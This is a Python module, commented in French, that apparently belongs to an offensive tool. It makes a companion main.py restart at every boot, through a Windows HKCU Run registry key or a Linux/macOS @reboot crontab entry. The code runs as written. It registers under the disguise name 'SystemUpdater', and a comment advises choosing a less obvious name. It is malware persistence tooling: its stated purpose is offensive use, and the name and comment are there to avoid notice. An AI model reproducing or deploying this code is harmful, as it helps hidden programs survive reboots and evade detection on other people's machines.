# ============================================================
#  persistence.py — Survie au reboot
#  Rôle : faire en sorte que main.py se relance automatiquement
#         après un redémarrage de la machine
#  Dépendances : winreg (natif Windows) / subprocess (Linux)
# ============================================================

# ── CONCEPT : LA PERSISTANCE ─────────────────────────────────
# Un programme qui disparaît au reboot est inutile en offensive.
# La persistance = s'enregistrer quelque part que l'OS consulte
# au démarrage pour savoir quoi lancer automatiquement.
#
# Chaque OS a ses mécanismes :
#
#   Windows → Clé de registre dans Run
#             HKCU\Software\Microsoft\Windows\CurrentVersion\Run
#             Tout programme listé ici se lance au login
#
#   Linux   → Crontab avec @reboot
#             @reboot /usr/bin/python3 /chemin/main.py
#             Exécuté au démarrage par le scheduler cron
#
# On détecte l'OS et on applique la bonne méthode.

import sys
import os
import subprocess


# Nom de la clé / entrée cron — identifiant unique de notre programme
# Change ce nom si tu veux éviter qu'il soit trop évident
APP_NAME = "SystemUpdater"

# Chemin absolu vers main.py — récupéré dynamiquement
# os.path.abspath(__file__) = chemin du fichier Python en cours
# os.path.dirname()         = dossier parent
SCRIPT_PATH = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "main.py"
)


# ── INSTALL ──────────────────────────────────────────────────

def install():
    """
    Installe la persistance selon l'OS détecté.
    À appeler une seule fois au premier lancement.
    """
    if sys.platform == "win32":
        _install_windows()
    elif sys.platform == "linux":
        _install_linux()
    elif sys.platform == "darwin":
        _install_mac()
    else:
        print("[Persistence] OS non supporté")


def uninstall():
    """
    Supprime la persistance — utile pour nettoyer après les tests.
    """
    if sys.platform == "win32":
        _uninstall_windows()
    elif sys.platform == "linux":
        _uninstall_linux()
    else:
        print("[Persistence] OS non supporté")


# ── WINDOWS ──────────────────────────────────────────────────

def _install_windows():
    """
    Écrit une clé dans le registre Windows.

    winreg est le module Python natif pour manipuler le registre.

    Structure du registre :
    HKEY_CURRENT_USER (HKCU)
      └── Software
            └── Microsoft
                  └── Windows
                        └── CurrentVersion
                              └── Run   ← on écrit ici
                                    └── SystemUpdater = "python main.py"
    """
    try:
        # winreg est uniquement disponible sur Windows
        import winreg

        # OpenKey() ouvre la clé Run en écriture (KEY_SET_VALUE)
        # HKEY_CURRENT_USER = registre de l'utilisateur courant
        # Pas besoin d'être admin — contrairement à HKEY_LOCAL_MACHINE
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )

        # La valeur = commande qui sera exécutée au démarrage
        command = f'python "{SCRIPT_PATH}"'

        # SetValueEx() écrit la valeur dans la clé
        # REG_SZ = type "chaîne de caractères" dans le registre
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, command)
        winreg.CloseKey(key)

        print(f"[Persistence] ✅ Windows — clé registre créée : {APP_NAME}")

    except ImportError:
        print("[Persistence] winreg non disponible (pas Windows)")
    except Exception as e:
        print(f"[Persistence] ❌ Erreur registre : {e}")


def _uninstall_windows():
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.DeleteValue(key, APP_NAME)
        winreg.CloseKey(key)
        print(f"[Persistence] ✅ Clé registre supprimée : {APP_NAME}")
    except Exception as e:
        print(f"[Persistence] ❌ {e}")


# ── LINUX ─────────────────────────────────────────────────────

def _install_linux():
    """
    Ajoute une entrée @reboot dans le crontab de l'utilisateur.

    crontab = fichier de tâches planifiées sous Linux/macOS
    @reboot  = exécuter la commande au démarrage du système

    Format d'une ligne cron :
    @reboot /usr/bin/python3 /chemin/vers/main.py

    On récupère le crontab existant, on ajoute notre ligne,
    et on réécrit le tout via "crontab -"
    """
    try:
        python_path = sys.executable  # chemin de l'interpréteur Python actuel
        cron_entry  = f"@reboot {python_path} {SCRIPT_PATH}\n"

        # Lecture du crontab existant
        # 2>/dev/null = ignore l'erreur si le crontab est vide
        result = subprocess.run(
            ["crontab", "-l"],
            capture_output=True,
            text=True
        )
        existing = result.stdout

        # Vérification : déjà installé ?
        if SCRIPT_PATH in existing:
            print("[Persistence] Déjà installé dans crontab")
            return

        # Ajout de notre entrée et réécriture
        new_crontab = existing + cron_entry
        subprocess.run(
            ["crontab", "-"],
            input=new_crontab,
            text=True,
            check=True
        )

        print(f"[Persistence] ✅ Linux — entrée crontab ajoutée")

    except FileNotFoundError:
        print("[Persistence] ❌ crontab non disponible")
    except Exception as e:
        print(f"[Persistence] ❌ Erreur crontab : {e}")


def _uninstall_linux():
    try:
        result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
        existing = result.stdout
        # On filtre les lignes qui contiennent notre script
        new_crontab = "\n".join(
            line for line in existing.splitlines()
            if SCRIPT_PATH not in line
        ) + "\n"
        subprocess.run(["crontab", "-"], input=new_crontab, text=True, check=True)
        print("[Persistence] ✅ Entrée crontab supprimée")
    except Exception as e:
        print(f"[Persistence] ❌ {e}")


# ── MACOS ─────────────────────────────────────────────────────

def _install_mac():
    """
    Sur macOS la méthode propre est un LaunchAgent (plist XML).
    Pour simplifier on utilise aussi le crontab — même logique que Linux.
    """
    _install_linux()


# ── TEST STANDALONE ──────────────────────────────────────────
if __name__ == "__main__":
    print(f"OS : {sys.platform}")
    print(f"Script : {SCRIPT_PATH}\n")
    print("1 → Installer")
    print("2 → Désinstaller")
    choice = input("Choix : ").strip()
    if choice == "1":
        install()
    elif choice == "2":
        uninstall()